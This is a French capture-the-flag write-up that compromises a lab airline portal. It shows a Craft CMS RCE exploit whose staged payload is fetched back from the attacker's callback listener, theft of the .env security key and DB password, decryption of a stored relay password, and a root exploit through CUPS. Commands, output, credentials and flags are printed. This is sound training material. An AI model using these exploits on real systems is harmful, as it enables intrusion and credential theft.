# User flag
On part avec les creds `contractor:Contractor2026!`, qui ne sont pas pour une session SSH.
On effectue d'abord un `nmap` sur l'IP fournie :
```bash
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
```
Pas la dernière version de SSH ; *OpenSSH 9.6p1* est vulnérable à la CVE-2024-6387. Peut prendre plusieurs heures avant de réussir, et je n'ai ni le niveau de confiance ni la patience de l'exploiter pour l'instant. De plus, le serveur n'a probablement pas la bonne configuration.

Microsoft Terminal Service est le service de connexion de bureau à distance Windows.
On se connecte avec les creds données, et on accède à distance à une session Linux, sur la machine *airside-ws01*
On passe alors en revue les premiers réflexes :
```bash
$ sudo -l
# Accès à toutes les commandes
$ cat /etc/passwd
# Il n'y a que notre session
```
On a un accès complet sur notre machine, et il n'y a rien de spécial dans les fichiers.
Il faut aller chercher dans le réseau d'autres machines et d'autres utilisateurs (déplacement horizontal). Dans le dossier `Browse Network`, il n'y a aucun élément.
```bash
$ ip a
10.159.143.45/24   # Diffère de celle utilisée pour se connecter
```
On ne peut installer aucune nouvelle bilbiothèque, donc il faut faire avec les applications disponibles, qui excluent `nmap`, `fping`.
Après avoir installé `LinPEAS`, on le lance puis on analyse les résultats de la partie réseau :
```bash
$ sudo ./linpeas.sh -t -d 10.159.143.45/24    # Rien d'intéressant
```

En se connectant au réseau Wi-Fi disponible *HTB international Wi-Fi*, on accède à une page internet d'aéroport.
![[Pasted image 20261001142154.png]]
Rien de concret sur le site, on récupère l'adresse IP `10.13.37.10`. On effectue un tunnel SSH ([[SSH#Création d'un tunnel SSH]]) pour accéder au site.

```bash
socat -v UNIX-LISTEN:/tmp/fake.sock,fork UNIX-CONNECT:/tmp/
```

Avec une requête WireShark, on obtient les creds suivant pour se connecter sur `/admin/login` : `jenny:Fl1ghtDeck2026!`.
Sur ce compte utilisateur, on peut y télécharger une BDD, avec dedans les hashs ce-dessous - le hash de jenny correspond au mot de passe utilisé pour la session.
```
admin:$2y$13$ZdTZwteklJx2.z6sEY35pehuiOsB28y3sGJTNozu.xTpYRe4MCGg2
jenny:$2y$13$abHJk/QQLb8BE4L2pkBblebjEeWCMyFAdwguN2d7rDHZnnHJWvG7q
```
Les hashs sont en coût 13 (ie $2^{13}$ itérations à chaque hash), beaucoup trop long même en attaque par dictionnaire.
On a une catégorie qui s'appelle "Find and Replace". En remplaçant le hash du mot de passe de `admin` par celui de "admin", on peut peut-être se connecter avec ces nouveaux mots de passe.
```
$2y$13$PfyJPsmmhCRQLWPKwmZQJeGmIfGmcsufHq2rKO4A3JY.x5RG3NEBq
```
Ca ne fonctionne pas, la DB n'a pas été modifiée.

En regardant ailleurs dans la DB, on trouve un profil de *mailRelay* avec un user `aporter` (Porter étant le nom de famille de Jenny) et un mot de passe stocké en B64 :
```
u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=
```
On ne peut pas le décoder directement, car ça donne :
```
»A;:Áyha>}Gj;084d2a750e524c1b0ed940adea92a2374f8f2c88cb54b403e06aac3e99e6ab30e¬cf#
8ò÷cHEçð°Ýsßãçu^t8#u¿r ÅìúÿçÊ|ú

```
Et le morceau en Hex est également illisible une fois décodé.

On voit que la version de Craft CMS est la 5.9.8, vulnérable à la [[CVE-2026-44011]].
```bash
python3 cve-craft.py -b http://portal.international.htb -u 'jenny' -p 'Fl1ghtDeck2026!' -c 'whoami' --force

[*] Logging in...
[+] Authenticated
[*] Craft version: unknown
[*] Listener on 0.0.0.0:35165 (callback: http://10.13.37.182:35165)
[*] Stage 1 (fetch): HTTP 500
[+] Target fetched staged script
[*] Stage 2 (exec): HTTP 500
[+] Exit code: 0
[+] Output:
www-data
```
La CVE fonctionne, on peut alors chercher des informations dans la machine du serveur, notamment la security key.
En regardant `/etc/passwd`, on voit que `aporter` est bien un utilisateur de la machine. Pour récupérer la `$_ENV['CRAFT_SECURITY_KEY']`, on cherche le fichier `.env` du serveur CraftCMS
```bash
contractor@airside-ws01:~$ python3 cve-craft.py -b http://portal.international.htb -u 'jenny' -p 'Fl1ghtDeck2026!' --force -c 'cat ../.env'

# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--41606de1-cf7a-4fc5-8b1e-6f746d801adf

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# General settings
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DEV_MODE=false
CRAFT_ALLOW_ADMIN_CHANGES=false
CRAFT_DISALLOW_ROBOTS=true

CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://portal.international.htb/
CRAFT_ENABLE_TWIG_SANDBOX=true
```
On obtient donc la clé de sécurité qui nous permettra de déchiffrer le password de *aporter*. Maintenant, on doit trouver comment le mot de passe est chiffré.
Dans le fichier [[#/var/www/portal/modules/htbairways/Module.php]], on y trouve une référence vers le fichier [[#/var/www/portal/modules/htbairways/console/controllers/MilesController.php]] qui contient le processus de décodage du mot de passe :
```php
$password = Craft::$app->getSecurity()
            ->decryptByKey(base64_decode($kv['mailRelayPassword']), $securityKey);
```
On créé alors une commande PHP pour reproduire ce schéma, en envoyant le code sur le serveur dans le dossier `/tmp` (en B64), puis on décode et on le lance :
```bash
$ cat > /tmp/d.php <<'EOF'
<?php
require '/var/www/portal/vendor/autoload.php';
$key  = 'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr';
$blob = 'u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=';
echo (new \yii\base\Security())->decryptByKey(base64_decode($blob), $key) . PHP_EOL;
EOF

$ base64 -w0 /tmp/d.php
PD9waHAKcmVxdWlyZSAnL3Zhci93d3cvcG9ydGFsL3ZlbmRvci9hdXRvbG9hZC5waHAnOwoka2V5ICA9ICdJR2NraWhpRks2NF9sclNnSko2UUxraVB6LW93MTNMcic7CiRibG9iID0gJ3UwRTdPZ2JCZVdoaFBuMUhhanNGTURnMFpESmhOelV3WlRVeU5HTXhZakJsWkRrME1HRmtaV0U1TW1FeU16YzBaamhtTW1NNE9HTmlOVFJpTkRBelpUQTJZV0ZqTTJVNU9XVTJZV0l6TUdVUHJHTm1Jd3FVT1BMM1kwZ2FoeFJGNXd2d3NCSGRBM1BmNCtkMVhuUTRJM1cvY3FERjdQci81OHFWZlBvTmw1dz0nOwplY2hvIChuZXcgXHlpaVxiYXNlXFNlY3VyaXR5KCkpLT5kZWNyeXB0QnlLZXkoYmFzZTY0X2RlY29kZSgkYmxvYiksICRrZXkpIC4gUEhQX0VPTDsK

$ python3 cve-craft.py -b http://portal.international.htb -u 'jenny' -p 'Fl1ghtDeck2026!' --force -c "echo PD9waHAKcmVxdWlyZSAnL3Zhci93d3cvcG9ydGFsL3ZlbmRvci9hdXRvbG9hZC5waHAnOwoka2V5ICA9ICdJR2NraWhpRks2NF9sclNnSko2UUxraVB6LW93MTNMcic7CiRibG9iID0gJ3UwRTdPZ2JCZVdoaFBuMUhhanNGTURnMFpESmhOelV3WlRVeU5HTXhZakJsWkRrME1HRmtaV0U1TW1FeU16YzBaamhtTW1NNE9HTmlOVFJpTkRBelpUQTJZV0ZqTTJVNU9XVTJZV0l6TUdVUHJHTm1Jd3FVT1BMM1kwZ2FoeFJGNXd2d3NCSGRBM1BmNCtkMVhuUTRJM1cvY3FERjdQci81OHFWZlBvTmw1dz0nOwplY2hvIChuZXcgXHlpaVxiYXNlXFNlY3VyaXR5KCkpLT5kZWNyeXB0QnlLZXkoYmFzZTY0X2RlY29kZSgkYmxvYiksICRrZXkpIC4gUEhQX0VPTDsK | base64 -d > /tmp/d.php && php /tmp/d.php"
Skyp0rt_Relay!26
```
Et on a alors les creds de `aporter` qui fonctionnent via SSH :
```
aporter:Skyp0rt_Relay!26
```
Et on récupère le flag :
```
ffb8df09c7b5b432f5e4e317508e63e3
```
# Root flag
On commence par lancer LinPEAS sur la machine (DL local -> copie RDP -> SCP).
Parmi les CVE intéressantes, il y a la [[CVE-2026-8933]] qui vise snap-confine, avec un PoC disponible dans le GitHub LPE Toolkit de portbuster1337. Ne fonctionne pas car aucun snap d'installé, et aucunement possible d'en installer un.

On voit que dans la catégorie des sockets vulnérable, le `/run/cups/cups.sock` est vulnérable. Elle correspond en fait à la [[CVE-2026-34990]], qui possède une PoC en Python, et qui fonctionne très bien :
```bash
aporter@portal:~$ python3 cve-cups.py --user aporter
[*] uid=1001 user=aporter target=/etc/sudoers.d/aporter-pwn
[*] Starting capture server on 127.0.0.1:9189
[*] Sending CUPS-Create-Local-Printer bait to our IPP server
[+] Captured token: FB8BE4BD65B2874227B08EDFA5C51A36
[*] Persist attempt 1 (printer=sudo19279)
[+] ROOT
uid=0(root) gid=0(root) groups=0(root)

[+] Run: sudo -i

aporter@portal:~$ sudo -i

root@portal:~# cat /root/root.txt
9c5d8dcdc0c18e43e725532bcccaa90d
```
# Fichiers
## /var/www/portal/modules/htbairways/Module.php
```php
<?php
/**
 * HTB Airways — Craft integration module.
 *
 * Provides the "HTB Airways Miles" loyalty integration. Outbound member mail
 * (Miles balance statements) is delivered through the HTB Airways SMTP relay;
 * the relay settings — host, port, username and the (encrypted) password — live
 * in the `htbairways_settings` table.
 *
 * The relay password is stored ENCRYPTED with the site security key and is only
 * decrypted in memory at send time (see console/controllers/MilesController).
 * It is never written to configuration or logs in cleartext.
 */

namespace modules\htbairways;

use Craft;
use yii\base\Module as BaseModule;

class Module extends BaseModule
{
    public function init(): void
    {
        Craft::setAlias('@modules/htbairways', __DIR__);

        // Register the console commands (`php craft htbairways/...`).
        if (Craft::$app instanceof \craft\console\Application) {
            $this->controllerNamespace = 'modules\\htbairways\\console\\controllers';
        }

        parent::init();
    }
}
```
## /var/www/portal/modules/htbairways/console/controllers/MilesController.php
```php
<?php
/**
 * HTB Airways Miles — member statement mailer.
 *
 * Emails monthly Miles balance statements to loyalty members through the HTB
 * Airways outbound SMTP relay. Run from ops' cron:
 *
 *     php craft htbairways/miles/send            # send statements
 *     php craft htbairways/miles/send --dryRun   # prepare only, don't transmit
 *
 * Relay configuration is read from the `htbairways_settings` table. The relay
 * password is stored there ENCRYPTED with the site security key (Craft's
 * Security component); it is decrypted in memory immediately before the SMTP
 * handshake and is never echoed or logged.
 */

namespace modules\htbairways\console\controllers;

use Craft;
use craft\db\Query;
use Symfony\Component\Mailer\Mailer;
use Symfony\Component\Mailer\Transport;
use Symfony\Component\Mime\Email;
use yii\console\Controller;
use yii\console\ExitCode;

class MilesController extends Controller
{
    /**
     * @var bool Prepare the relay + recipient list but do not transmit.
     */
    public bool $dryRun = false;

    public function options($actionID): array
    {
        return array_merge(parent::options($actionID), ['dryRun']);
    }

    /**
     * Send Miles balance statements to members via the outbound relay.
     */
    public function actionSend(): int
    {
        $relay = $this->relayConfig();
        $members = $this->members();

        $this->stdout("HTB Airways \u{00b7} Miles statement run\n");
        $this->stdout(sprintf("Relay   : %s@%s:%d\n", $relay['user'], $relay['host'], $relay['port']));
        $this->stdout(sprintf("Members : %d queued\n", count($members)));

        if ($this->dryRun) {
            $this->stdout("Credential loaded; dry run \u{2014} nothing transmitted.\n");
            return ExitCode::OK;
        }

        // Don't let a segmented/unreachable relay hang the whole run.
        ini_set('default_socket_timeout', '5');

        $dsn = sprintf(
            'smtp://%s:%s@%s:%d',
            rawurlencode($relay['user']),
            rawurlencode($relay['password']),
            $relay['host'],
            $relay['port']
        );

        try {
            $mailer = new Mailer(Transport::fromDsn($dsn));
            $sent = 0;
            foreach ($members as $m) {
                $mailer->send((new Email())
                    ->from('miles@htbairways.htb')
                    ->to($m['email'])
                    ->subject('Your HTB Airways Miles statement')
                    ->text("Dear {$m['name']},\n\nYour current HTB Airways Miles balance is {$m['miles']}.\n\n\u{2014} HTB Airways Miles\n"));
                $sent++;
            }
            $this->stdout("Sent {$sent} statement(s).\n");
            return ExitCode::OK;
        } catch (\Throwable $e) {
            Craft::warning('Miles statement run could not reach the relay: ' . $e->getMessage(), 'htbairways');
            $this->stderr("Relay unreachable; statements re-queued for the next run.\n");
            return ExitCode::TEMPFAIL;
        }
    }

    /**
     * Read the relay configuration from `htbairways_settings`.
     *
     * `mailRelayPassword` is a security-key-encrypted blob (base64). Decrypt it
     * in memory with the site security key; never persist or log the plaintext.
     */
    private function relayConfig(): array
    {
        $kv = array_column(
            (new Query())->select(['name', 'value'])->from('{{%htbairways_settings}}')->all(),
            'value',
            'name'
        );

        $securityKey = Craft::$app->getConfig()->getGeneral()->securityKey;
        // !! ----------- ICI ------------- !!
        $password = Craft::$app->getSecurity()
            ->decryptByKey(base64_decode($kv['mailRelayPassword']), $securityKey);

        return [
            'host' => $kv['mailRelayHost'] ?? 'mail.htbairways.htb',
            'port' => (int)($kv['mailRelayPort'] ?? 587),
            'user' => $kv['mailRelayUser'] ?? 'aporter',
            'password' => $password,
        ];
    }

    /**
     * Loyalty members due a statement. (Demo roster for the dev environment.)
     */
    private function members(): array
    {
        return [
            ['name' => 'Jordan Rivera', 'email' => 'j.rivera@example.htb', 'miles' => 42150],
            ['name' => 'Kwame Osei',    'email' => 'k.osei@example.htb',    'miles' => 18790],
            ['name' => 'Mei Tanaka',    'email' => 'm.tanaka@example.htb',  'miles' => 9630],
        ];
    }
}
```